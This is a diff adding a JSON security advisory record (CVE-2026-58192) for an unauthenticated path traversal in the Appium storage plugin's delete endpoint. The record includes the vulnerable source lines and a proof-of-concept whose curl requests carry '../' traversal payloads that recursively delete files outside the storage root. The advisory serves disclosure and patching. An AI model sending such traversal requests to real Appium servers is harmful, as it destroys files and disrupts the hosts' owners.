@@ -1,0 +1,62 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-11-20T14:34:30Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@appium/storage-plugin"
+  },
+  "Advisory": {
+    "DatabaseId": 538590,
+    "Id": "GSA_kwCzR0hTQS1qd2d4LW1wOW0tandjcs4ACDfe",
+    "GhsaId": "GHSA-jwgx-mp9m-jwcr",
+    "References": [
+      {
+        "Url": "https://github.com/appium/appium/security/advisories/GHSA-jwgx-mp9m-jwcr"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-58192"
+      },
+      {
+        "Url": "https://github.com/appium/appium/pull/22362"
+      },
+      {
+        "Url": "https://github.com/appium/appium/commit/5fee01752f2782e96fbe64fd13520b433d4a7535"
+      },
+      {
+        "Url": "https://github.com/appium/appium/releases/tag/%40appium/storage-plugin%401.1.6"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-jwgx-mp9m-jwcr"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-jwgx-mp9m-jwcr"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-58192"
+      }
+    ],
+    "Description": "## Summary\n\nThe Appium storage plugin exposes an HTTP endpoint `POST /storage/delete` that takes a user-supplied `name` and deletes it from the server storage folder. The handler passes `name` straight into `path.join(storageRoot, name)` and then `fs.rimraf()` **without any path sanitization**. By sending a `name` containing `../` sequences, an unauthenticated remote client can escape the storage root and **recursively delete arbitrary files and directories** that the Appium process user can write, anywhere on the host filesystem.\n\nThe same plugin's *upload* path validates the name via `fs.sanitizeName` (`requireValidItemOptions`), but the *delete* path does not an asymmetry that makes the missing validation unambiguous.\n\n\n### Details\n\nPublished build (`node_modules/@appium/storage-plugin/build/lib/storage.js`), and source (`packages/storage-plugin/lib/`):\n\n- `packages/storage-plugin/lib/storage.ts:65-75` — `Storage.delete()`:\n  ```ts\n  async delete(name: string): Promise\u003cboolean\u003e {\n    if (name.toLowerCase().endsWith(TMP_EXT)) {\n      return false;\n    }\n    const destinationPath = path.join(this._root, name);   // \u003c-- no sanitization\n    if (!(await fs.exists(destinationPath))) {\n      return false;\n    }\n    await fs.rimraf(destinationPath);                       // \u003c-- recursive delete\n    return true;\n  }\n  ```\n- `packages/storage-plugin/lib/plugin.ts:77-83` — handler passes raw body:\n  ```ts\n  STORAGE_HANDLERS.deleteStorageItem = async function deleteStorageItem(req) {\n    return await executeStorageMethod(\n      async (storage) =\u003e await storage.delete(parseRequestArgs(req, ['name']).name),\n    );\n  };\n  ```\n`parseRequestArgs` (`plugin.ts:94-106`) only checks that the key exists; it does **not** validate the value.\n- Contrast — the upload path *does* sanitize: `storage.ts:53-54` `add()` →\n`requireValidItemOptions()` (`storage.ts:236-256`) rejects any `name` that differs from `fs.sanitizeName(name)`. `delete()` skips this entirely.\n\n### PoC\n\n1. Install and start the server with the storage plugin:\n   ```sh\n   npm install appium@3.5.0\n   ./node_modules/.bin/appium plugin install --source=npm @appium/storage-plugin\n   ./node_modules/.bin/appium --use-plugins=storage --address 127.0.0.1 --port 4723\n   ```\n(Default `--address` is `0.0.0.0`; `127.0.0.1` used here for a contained test.)\n\n2. Plant a victim file/dir outside the storage root, then delete via traversal:\n   ```sh\n   mkdir -p /tmp/pv_dir \u0026\u0026 echo SECRET \u003e /tmp/pv_dir/important.txt\n   echo single \u003e /tmp/pv_file.txt\n\n   curl -s -X POST http://127.0.0.1:4723/storage/delete \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"name\":\"../../../../../../../../../../tmp/pv_file.txt\"}'\n   # -\u003e {\"value\":true}\n\n   curl -s -X POST http://127.0.0.1:4723/storage/delete \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"name\":\"../../../../../../../../../../tmp/pv_dir\"}'\n   # -\u003e {\"value\":true}\n   ```\n\n\u003cimg width=\"2182\" height=\"678\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a4984132-3334-41c5-9a29-12ec59461d25\" /\u003e\n\n\n### Impact\n\nAn unauthenticated attacker who can reach the Appium HTTP port (network by default, or cross-origin via a victim browser due to default CORS + no auth) can recursively delete any file or directory writable by the Appium process user. On CI runners, device farms, and developer machines this enables destruction of source trees, build artifacts, SSH keys, configuration, or the OS user profile data loss and denial of service. Appium frequently runs with broad privileges on shared device-lab hosts, amplifying impact.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-11-20T14:34:30Z",
+    "Severity": "HIGH",
+    "Summary": "appium allows unauthenticated arbitrary file/directory deletion in @appium/storage-plugin",
+    "UpdatedAt": "2026-11-20T14:34:30Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.6,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.1.6"
+      },
+      "VulnerableVersionRange": "\u003c 1.1.6"
+    }
+  ]
+}
